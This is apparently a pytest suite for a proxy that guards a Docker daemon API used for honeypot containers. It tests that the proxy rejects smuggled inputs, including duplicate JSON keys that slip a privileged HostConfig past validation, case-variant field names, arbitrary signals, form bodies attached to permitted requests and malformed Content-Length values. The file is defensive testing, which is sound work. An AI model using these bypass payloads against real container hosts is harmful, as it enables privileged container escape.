def test_the_content_type_is_the_guards_to_choose_per_endpoint():
    assert check("POST", f"/containers/create?{QUERY}", json.dumps(GOOD).encode()).content_type == (
        "application/json"
    )
    persona = f"/containers/abc/archive?path={PERSONA_DIR}"
    assert check("PUT", persona, b"tar bytes").content_type == "application/x-tar"
    for method, target in (
        ("POST", "/containers/abc/kill?signal=TERM"),
        ("POST", f"/images/create?fromImage={COWRIE_IMAGE}"),
        ("GET", "/containers/abc/logs"),
    ):
        assert check(method, target, b"").content_type is None


@pytest.mark.parametrize(
    "target",
    [
        f"/images/create?fromImage={COWRIE_IMAGE}&changes=ENV+X=1",
        f"/images/create?fromImage={COWRIE_IMAGE}&message=x",
        f"/images/create?fromImage={COWRIE_IMAGE}&fromSrc=",
        f"/images/create?fromImage={COWRIE_IMAGE}&repo=",
    ],
)
def test_an_image_pull_takes_only_the_image_tag_and_platform(target):
    with pytest.raises(Denied):
        check("POST", target, b"")


def test_an_image_pull_may_name_a_platform():
    assert check("POST", f"/images/create?fromImage={COWRIE_IMAGE}&platform=linux/amd64", b"")


@pytest.mark.parametrize("action", ["stop", "restart"])
@pytest.mark.parametrize("signal", ["SIGHUP", "USR1", "STOP", "0", ""])
def test_stop_and_restart_cannot_deliver_an_arbitrary_signal(action, signal):
    with pytest.raises(Denied):
        check("POST", f"/containers/abc/{action}?signal={signal}", b"")


@pytest.mark.parametrize("action", ["stop", "restart"])
def test_stop_and_restart_still_accept_the_ordinary_calls(action):
    assert check("POST", f"/containers/abc/{action}", b"")
    assert check("POST", f"/containers/abc/{action}?t=5", b"")
    assert check("POST", f"/containers/abc/{action}?signal=SIGTERM&t=5", b"")


def _repeated_hostconfig_body() -> str:
    """A privileged HostConfig first, the engine's own (valid) one last."""
    return (
        f'{{"Image": "{COWRIE_IMAGE}", "Labels": {{"honeypot-mcp": "true"}}, '
        f'"HostConfig": {{"Privileged": true}}, "HostConfig": {json.dumps(GOOD["HostConfig"])}}}'
    )


def _create_text(text: str) -> guard.Verdict:
    return check("POST", f"/containers/create?{QUERY}", text.encode())


def test_a_create_body_that_repeats_a_key_is_refused():
    """The real attack: Python validates the last `HostConfig`, the daemon merges both."""
    assert _create_text(json.dumps(GOOD)).content_type == "application/json"
    with pytest.raises(Denied) as exc:
        _create_text(_repeated_hostconfig_body())
    assert exc.value.status == 400 and "duplicate" in exc.value.message


@pytest.mark.parametrize(
    "text",
    [
        # nested, exact
        '{"HostConfig": {"Privileged": true, "Privileged": false}}',
        # Go matches struct fields case-insensitively, so these name one field twice
        '{"Image": "a", "image": "b"}',
        '{"HostConfig": {"CapDrop": ["ALL"], "capdrop": []}}',
        # inside a list element
        '{"HostConfig": {"Mounts": [{"Type": "volume", "Type": "bind"}]}}',
    ],
)
def test_repeated_keys_are_refused_wherever_they_occur(text):
    with pytest.raises(Denied) as exc:
        guard._loads_strict(text)
    assert "duplicate" in exc.value.message


def test_non_finite_json_constants_and_bad_utf8_are_refused():
    for raw in ('{"Memory": NaN}', '{"Memory": Infinity}', '{"Memory": -Infinity}'):
        with pytest.raises(Denied):
            guard._loads_strict(raw)
    with pytest.raises(Denied):
        guard._loads_strict(b'{"Image": "\xff"}')
    with pytest.raises(Denied):
        guard._loads_strict("[" * 100000)


def test_a_container_listing_filter_with_a_repeated_key_is_refused():
    base = "/containers/json?filters="
    ok = '{"label":["honeypot-mcp=true"]}'
    assert check("GET", base + ok, b"")
    with pytest.raises(Denied):
        check("GET", base + '{"label":["honeypot-mcp=true"],"label":["x=y"]}', b"")


async def test_a_client_chosen_content_type_and_other_headers_are_not_forwarded(proxy):
    """Only the guard's own Content-Type reaches the daemon, and only a small allowlist else."""
    listen, fake, _ = proxy
    body = json.dumps(GOOD).encode()
    raw = (
        f"POST /containers/create?{QUERY} HTTP/1.1\r\nHost: evil\r\n"
        f"Content-Type: {FORM}\r\nX-HTTP-Method-Override: DELETE\r\nX-Method-Override: DELETE\r\n"
        "X-Registry-Auth: e30=\r\nUser-Agent: docker-sdk\r\nAccept: */*\r\nX-Evil: 1\r\n"
        f"Content-Length: {len(body)}\r\n\r\n"
    ).encode() + body
    assert (await _roundtrip(listen, raw)).startswith(b"HTTP/1.1 200")
    sent = fake.headers[0]
    assert sent["content-type"] == "application/json"
    assert sent["user-agent"] == "docker-sdk" and sent["accept"] == "*/*"
    assert set(sent) == {
        "host", "connection", "content-type", "content-length", "user-agent", "accept"
    }  # fmt: skip


async def test_the_persona_archive_is_sent_as_tar_whatever_the_client_declared(proxy):
    listen, fake, _ = proxy
    raw = (
        f"PUT /containers/honeypot-ok/archive?path={PERSONA_DIR} HTTP/1.1\r\nHost: x\r\n"
        f"Content-Type: {FORM}\r\nContent-Length: 4\r\n\r\ndata"
    ).encode()
    assert (await _roundtrip(listen, raw)).startswith(b"HTTP/1.1 200")
    assert fake.headers[-1]["content-type"] == "application/x-tar"
    assert fake.requests[-1][2] == b"data"


@pytest.mark.parametrize(
    "request_line",
    [
        f"POST /images/create?fromImage={COWRIE_IMAGE} HTTP/1.1",
        "POST /containers/honeypot-ok/kill?signal=TERM HTTP/1.1",
        "POST /containers/honeypot-ok/kill HTTP/1.1",
    ],
)
async def test_a_form_body_cannot_ride_along_a_permitted_query(proxy, request_line):
    """The reproduced attack, end to end: nothing reaches the daemon, not even the label probe."""
    listen, fake, g = proxy
    body = IMPORT_BODY if "images" in request_line else b"signal=HUP"
    raw = (
        f"{request_line}\r\nHost: x\r\nContent-Type: {FORM}\r\nContent-Length: {len(body)}\r\n\r\n"
    ).encode() + body
    reply = await _roundtrip(listen, raw)
    assert reply.startswith(b"HTTP/1.1 400"), reply[:80]
    assert fake.requests == [] and g.denied == 1


async def test_a_create_with_a_repeated_key_never_reaches_the_daemon(proxy):
    listen, fake, _ = proxy
    body = _repeated_hostconfig_body().encode()
    raw = (
        f"POST /containers/create?{QUERY} HTTP/1.1\r\nHost: x\r\n"
        f"Content-Type: application/json\r\nContent-Length: {len(body)}\r\n\r\n"
    ).encode() + body
    assert (await _roundtrip(listen, raw)).startswith(b"HTTP/1.1 400")
    assert fake.requests == []


@pytest.mark.parametrize("length", ["\u00b2", "+1", "1_0", "0x10", "-1", " "])
async def test_a_content_length_that_is_not_plain_ascii_digits_is_refused(proxy, length):
    listen, fake, _ = proxy
    raw = (
        f"POST /containers/honeypot-ok/start HTTP/1.1\r\nHost: x\r\nContent-Length: {length}\r\n\r\n"
    ).encode("latin-1")
    reply = await _roundtrip(listen, raw)
    assert reply.startswith(b"HTTP/1.1 400"), reply[:80]
    assert fake.requests == []
